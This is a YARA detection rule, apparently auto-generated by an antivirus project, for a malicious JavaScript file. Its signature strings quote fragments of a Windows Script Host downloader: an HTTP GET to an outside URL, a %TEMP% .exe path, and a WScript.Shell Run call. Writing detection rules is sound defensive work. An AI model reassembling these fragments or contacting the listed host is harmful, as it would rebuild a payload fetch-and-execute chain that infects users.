rule sig_20160329_abe1715378a15f7851cd199080779333 {
  meta:
    description = "datamaliciousorder - file 20160329_abe1715378a15f7851cd199080779333.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1e51175b2cbb891d5fe26661158f14fa714922c1dba849d7b8e5a651a186a519"

  strings:
    $s1  = "r[L](\"GET\", \"http://www.the2ndedit.com/j1oisa\", false);" fullword ascii
    $s2  = "function Wr() {return NT[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HpBVJBeQC.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Xs](U() * 11); if (r[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Kf(kU, cx){Fn = Fn * 1; return kU - cx;};" fullword ascii
    $s5  = "var NT = function EJ() {return WScript[M](\"WScript.Shell\");}(), q0 = 11;" fullword ascii
    $s6  = "function qG(){return \"\" + mn;};" fullword ascii
    $s7  = "function fk() {return ((O0 == true) && (O0 == q1)) ? 1 : Fn;};" fullword ascii
    $s8  = "function VK(k){NT[\"Run\"](k, Fn, Fn);};" fullword ascii
    $s9  = "function U(){return 22;};" fullword ascii
    $s10 = " while (O){" fullword ascii
    $s11 = "function FN(Rz) {var fP = (1, 2, 3, 4, 5, Rz); return fP;};" fullword ascii
    $s12 = "return Kf(s, DV);" fullword ascii
    $s13 = "function q(){return M;};" fullword ascii
    $s14 = "var H = new this[\"Date\"]();" fullword ascii
    $s15 = "function iF()" fullword ascii
    $s16 = "q1 = true; " fullword ascii
    $s17 = "var q1 = false;" fullword ascii
    $s18 = "var O0 = false;" fullword ascii
    $s19 = "O0 = true; " fullword ascii
    $s20 = "} catch(HY){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}